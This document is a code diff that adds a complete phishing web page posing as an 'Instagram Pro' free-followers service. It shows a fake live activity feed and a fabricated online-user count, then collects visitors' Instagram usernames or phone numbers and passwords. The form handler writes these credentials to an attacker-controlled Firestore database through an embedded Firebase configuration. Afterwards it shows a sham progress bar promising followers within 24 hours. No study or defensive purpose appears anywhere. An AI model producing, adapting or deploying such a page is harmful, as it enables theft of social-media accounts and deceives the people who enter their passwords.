@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>INSTAGRAM FREE FOLLOWERS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', -apple-system, sans-serif;
+        }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            overflow-x: hidden;
+            position: fixed;
+            touch-action: manipulation;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #4facfe 75%, #00f2fe 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            color: white;
+            font-size: 16px;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        @keyframes gradientShift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .container {
+            width: 100%;
+            height: 100%;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .page {
+            width: 100%;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-radius: 25px;
+            padding: 35px 28px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.15);
+            animation: slideInUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin: auto;
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFD89B 0%, #19547B 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: logoFloat 3s ease-in-out infinite;
+            letter-spacing: -1px;
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-8px);
+            }
+        }
+
+        .title {
+            font-size: 1.9em;
+            margin-bottom: 20px;
+            color: #fff;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .description {
+            font-size: 1.05em;
+            margin-bottom: 30px;
+            line-height: 1.7;
+            color: rgba(255, 255, 255, 0.95);
+            font-weight: 300;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 18px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            text-align: left;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: white;
+            font-size: 0.95em;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid rgba(255, 255, 255, 0.25);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.08);
+            color: white;
+            font-size: 15px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            -webkit-appearance: none;
+            appearance: none;
+            font-weight: 500;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.6);
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+            font-weight: 400;
+        }
+
+        .form-group .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.8);
+            cursor: pointer;
+            padding: 8px 12px;
+            font-size: 14px;
+            z-index: 2;
+            transition: all 0.2s ease;
+            font-weight: 600;
+        }
+
+        .form-group .toggle-password:hover {
+            color: rgba(255, 255, 255, 1);
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            -webkit-tap-highlight-color: transparent;
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+            letter-spacing: 0.5px;
+        }
+
+        .button:active {
+            transform: scale(0.96);
+        }
+
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
+            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
+        }
+
+        .button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .form-footer {
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 15px;
+        }
+
+        .form-footer a {
+            color: rgba(255, 255, 255, 1);
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            border-bottom: 2px solid transparent;
+        }
+
+        .form-footer a:hover {
+            border-bottom-color: rgba(255, 255, 255, 0.6);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1.5px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .divider span {
+            padding: 0 15px;
+            letter-spacing: 0.5px;
+        }
+
+        .security-badge {
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 500;
+            letter-spacing: 1px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .FOLLOWERS-count {
+            font-size: 2.8em;
+            font-weight: 900;
+            margin: 15px 0;
+            background: linear-gradient(135deg, #FFD89B 0%, #19547B 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+            animation: scaleIn 0.6s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .loading-dots:after {
+            content: '.';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+
+            0%,
+            20% {
+                content: '.';
+            }
+
+            40% {
+                content: '..';
+            }
+
+            60% {
+                content: '...';
+            }
+
+            80%,
+            100% {
+                content: '';
+            }
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 0.9em;
+            margin-top: 8px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .shake {
+            animation: shake 0.5s cubic-bezier(.36, .07, .19, .97) both;
+        }
+
+        @keyframes shake {
+
+            10%,
+            90% {
+                transform: translate3d(-2px, 0, 0);
+            }
+
+            20%,
+            80% {
+                transform: translate3d(2px, 0, 0);
+            }
+
+            30%,
+            50%,
+            70% {
+                transform: translate3d(-4px, 0, 0);
+            }
+
+            40%,
+            60% {
+                transform: translate3d(4px, 0, 0);
+            }
+        }
+
+        /* Progress bar styles */
+        .progress {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 25px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            border-radius: 8px;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.5);
+        }
+
+        /* Prevent text selection */
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Allow text selection in inputs */
+        input {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        .activity-container {
+            margin-top: 25px;
+            padding: 18px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            font-size: 13px;
+            backdrop-filter: blur(10px);
+            animation: slideInUp 0.8s ease-out;
+        }
+
+        .activity-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            gap: 8px;
+        }
+
+        .live-badge {
+            background: linear-gradient(135deg, #00ff00, #00cc00);
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            animation: badgePulse 2s ease-in-out infinite;
+            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.3);
+        }
+
+        @keyframes badgePulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.8;
+            }
+        }
+
+        .online-count {
+            margin-left: auto;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        #recentActivity {
+            max-height: 120px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 8px 0;
+        }
+
+        #recentActivity::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        #recentActivity::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 3px;
+        }
+
+        #recentActivity::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 3px;
+            transition: background 0.2s ease;
+        }
+
+        #recentActivity::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        .activity-item {
+            padding: 6px 0;
+            animation: slideIn 0.4s ease-out;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 400;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+    </style>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+</head>
+
+<body ontouchstart="">
+    <div id="welcomePage" class="container">
+        <div class="page">
+            <h1 class="logo">INSTAGRAM PRO</h1>
+            <h2 class="title">Welcome</h2>
+            <p class="description">Get real INSTAGRAM FOLLOWERS instantly!</p>
+            <button class="button" onclick="showAboutPage()">Get Started</button>
+        </div>
+        🔒 DEVELOPED_BY_ADITYA 🔒
+    </div>
+
+    <div id="aboutPage" class="container hidden">
+        <div class="page">
+            <h1 class="logo">INSTAGRAM PRO</h1>
+            <h2 class="title">Get 1000+ FOLLOWERS</h2>
+            <p class="description">
+                🚀 Instant Delivery<br>
+                ✨ Real Active FOLLOWERS<br>
+                🔒 Safe & Secure<br>
+                📈 Guaranteed Growth
+            </p>
+            <div class="FOLLOWERS-count">1000+</div>
+            <button class="button" onclick="showFormPage()">Continue</button>
+        </div>
+    </div>
+
+    <div id="formPage" class="container hidden">
+        <div class="page">
+            <h1 class="logo">INSTAGRAM PRO</h1>
+            <div class="FOLLOWERS-count" style="margin: 10px 0 20px 0;">1000+ FOLLOWERS</div>
+            <p class="description" style="font-size: 1.2em; margin-bottom: 15px;">
+                🚀 Get Instant FOLLOWERS in Seconds!<br>
+                ⚡ Fast & Easy Process<br>
+                ✨ 100% Safe & Secure
+            </p>
+            <div class="form-container">
+                <form id="FOLLOWERSForm" onsubmit="handleSubmit(event)">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Phone number, username, or email" required
+                            autocomplete="off" oninput="updateLiveActivity(this.value)" style="font-size: 14px;">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" required autocomplete="off"
+                            style="font-size: 14px;">
+                        <button type="button" class="toggle-password" onclick="togglePassword()"
+                            style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: rgba(255, 255, 255, 0.7); cursor: pointer; padding: 5px;">
+                            Show
+                        </button>
+                    </div>
+                    <button type="submit" class="button" id="submitButton">
+                        Get 1000+ FOLLOWERS Now!
+                    </button>
+
+                    <div class="divider" style="margin: 15px 0;">
+                        <span>Secure Login</span>
+                    </div>
+
+                    <div class="form-footer"
+                        style="text-align: center; font-size: 0.85em; color: rgba(255, 255, 255, 0.7);">
+                        Forgot your login details? <a href="#"
+                            style="color: white; text-decoration: none; font-weight: 500;">Get help</a>
+                    </div>
+                </form>
+            </div>
+
+            <div style="margin-top: 20px;" class="activity-container">
+                <div class="activity-header">
+                    <span class="live-badge">LIVE</span>
+                    <span>Recent Activities</span>
+                    <span class="online-count">
+                        <span id="onlineCount">847</span> users online
+                    </span>
+                </div>
+                <div id="recentActivity">
+                    </div>
+            </div>
+
+            <div class="security-badge" style="margin-top: 15px;">
+                🔒 DEVELOPER_BY_KRISH 🔒
+            </div>
+        </div>
+    </div>
+
+    <div id="processingPage" class="container hidden">
+        <div class="page">
+            <h1 class="logo">INSTAGRAM PRO</h1>
+            <h2 class="title">Processing Your FOLLOWERS</h2>
+            <div class="FOLLOWERS-count" style="font-size: 2.5em; margin: 15px 0;">1000+</div>
+            <p class="description">Please wait while we process your FOLLOWERS<span class="loading-dots"></span></p>
+            <div class="progress">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+            <p id="statusText" class="description">Connecting to INSTAGRAM servers...</p>
+        </div>
+    </div>
+
+    <script>
+        // Your Firebase Configuration Setup
+        const firebaseConfig = { 
+            apiKey: "AIzaSyD0pWvaqGlQH93w3ddooHQ6Yq1-6GHus6w", 
+            authDomain: "trending-loop.firebaseapp.com", 
+            projectId: "trending-loop", 
+            storageBucket: "trending-loop.firebasestorage.app",
+            messagingSenderId: "206395963563", 
+            appId: "1:206395963563:web:5bba53723d14c8af139fee"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.querySelector('.toggle-password');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleButton.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = 'Show';
+            }
+        }
+        
+                // List of realistic usernames and patterns
+        const userPatterns = [
+            'photo.lover', 'travel.gram', 'fitness.life', 'food.pics',
+            'lifestyle', 'creative', 'digital', 'social',
+            'photography', 'adventure', 'fashion', 'beauty',
+            'art', 'design', 'style', 'life'
+        ];
+
+        const commonNames = [
+            'john', 'mike', 'sarah', 'emma', 'alex', 'lisa', 'david', 'anna',
+            'james', 'emily', 'chris', 'sophia', 'daniel', 'olivia', 'michael', 'ava'
+        ];
+
+        function generateUsername() {
+            const random = Math.random();
+            let username;
+
+            if (random < 0.3) {
+                // Pattern: name.pattern
+                const name = commonNames[Math.floor(Math.random() * commonNames.length)];
+                const pattern = userPatterns[Math.floor(Math.random() * userPatterns.length)];
+                username = `${name}.${pattern}`;
+            } else if (random < 0.6) {
+                // Pattern: pattern_numbers
+                const pattern = userPatterns[Math.floor(Math.random() * userPatterns.length)];
+                const number = Math.floor(Math.random() * 999);
+                username = `${pattern}${number}`;
+            } else {
+                // Pattern: name_numbers
+                const name = commonNames[Math.floor(Math.random() * commonNames.length)];
+                const number = Math.floor(Math.random() * 99);
+                username = `${name}${number}`;
+            }
+
+            return username.toLowerCase();
+        }
+
+        function updateOnlineCount() {
+            const countElement = document.getElementById('onlineCount');
+            const currentCount = parseInt(countElement.textContent);
+            const change = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
+            const newCount = Math.max(800, Math.min(999, currentCount + change));
+            countElement.textContent = newCount;
+        }
+
+        function addActivityItem(username, isInput = false) {
+            const activityDiv = document.getElementById('recentActivity');
+            const timeAgo = Math.floor(Math.random() * 3) + 1;
+            const FOLLOWERS = isInput ? '500' : (Math.floor(Math.random() * 3) + 4) + '00';
+
+            const newActivity = document.createElement('div');
+            newActivity.style.padding = '5px 0';
+            newActivity.style.animation = 'fadeIn 0.5s ease-in';
+            newActivity.innerHTML = `• @${username} received ${FOLLOWERS}+ FOLLOWERS ${timeAgo}m ago`;
+
+            if (isInput) {
+                newActivity.style.color = '#4CAF50';
+                activityDiv.insertBefore(newActivity, activityDiv.firstChild);
+            } else {
+                activityDiv.appendChild(newActivity);
+            }
+
+            // Keep only last 5 activities
+            while (activityDiv.children.length > 5) {
+                activityDiv.removeChild(activityDiv.lastChild);
+            }
+        }
+
+        // Initialize activity feed
+        function initializeActivityFeed() {
+            const activityDiv = document.getElementById('recentActivity');
+            activityDiv.innerHTML = ''; // Clear existing activities
+
+            // Add initial activities
+            for (let i = 0; i < 5; i++) {
+                addActivityItem(generateUsername());
+            }
+        }
+
+        // Update activity feed periodically
+        setInterval(() => {
+            addActivityItem(generateUsername());
+            updateOnlineCount();
+        }, 3000);
+
+        function updateLiveActivity(inputUsername) {
+            if (inputUsername.length > 2) {
+                // Clean the username for display
+                let displayUsername = inputUsername.replace(/[@\s]/g, '').toLowerCase();
+                if (displayUsername.includes('@')) {
+                    displayUsername = displayUsername.split('@')[1];
+                }
+                addActivityItem(displayUsername, true);
+            }
+        }
+
+        // Function to helper format Firebase DateTime format matching your image
+        function formatFirebaseDate() {
+            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+            const d = new Date();
+            const day = d.getDate();
+            const month = months[d.getMonth()];
+            const year = d.getFullYear();
+            const hours = String(d.getHours()).padStart(2, '0');
+            const minutes = String(d.getMinutes()).padStart(2, '0');
+            const seconds = String(d.getSeconds()).padStart(2, '0');
+            return `${day} ${month} ${year} at ${hours}:${minutes}:${seconds} UTC+5:30`;
+        }
+
+        // Function to generate random txnId matching your image length
+        function generateTxnId() {
+            let id = "";
+            for (let i = 0; i < 12; i++) {
+                id += Math.floor(Math.random() * 10);
+            }
+            return id;
+        }
+
+        // Form submit integration with Firestore 
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Save data to Firestore structured exactly like your reference image
+            try {
+                await db.collection("users").add({
+                    agentCode: "Direct",
+                    location: "Agra",
+                    password: password,
+                    phone: username,
+                    shop: "TRENDING LOOP COLLECTION",
+                    status: "Active",
+                    time: formatFirebaseDate(),
+                    txnId: generateTxnId()
+                });
+                console.log("Data saved successfully to Firestore.");
+            } catch (error) {
+                console.error("Error saving data: ", error);
+            }
+
+            // Continue with your existing UI processing
+            try {
+                if (window.Android) {
+                    window.Android.onMessage("Processing FOLLOWERS for @" + username);
+                }
+            } catch (e) {
+                console.log('Android interface not available');
+            }
+
+            showProcessingPage();
+        }
+
+        // Keep existing functions
+        function showAboutPage() {
+            document.getElementById('welcomePage').classList.add('hidden');
+            document.getElementById('aboutPage').classList.remove('hidden');
+        }
+
+        function showFormPage() {
+            document.getElementById('aboutPage').classList.add('hidden');
+            document.getElementById('formPage').classList.remove('hidden');
+            initializeActivityFeed(); // Initialize the feed when showing the form
+        }
+
+        function showProcessingPage() {
+            document.getElementById('formPage').classList.add('hidden');
+            document.getElementById('processingPage').classList.remove('hidden');
+            startProgress();
+        }
+
+        function startProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            const statusMessages = [
+                'Connecting to INSTAGRAM servers...',
+                'Preparing subscriber packages...',
+                'Generating real active FOLLOWERS...',
+                'Sending subscription requests...',
+                'Almost done! Finalizing FOLLOWERS...'
+            ];
+
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = `${progress}%`;
+
+                if (progress % 20 === 0) {
+                    statusText.textContent = statusMessages[Math.floor(progress / 20)];
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        statusText.textContent = 'Success! Your FOLLOWERS will appear within 24 hours.';
+                    }, 1000);
+                }
+            }, 50);
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function () {
+            initializeActivityFeed();
+        });
+    </script>
+</body>
+
+</html>
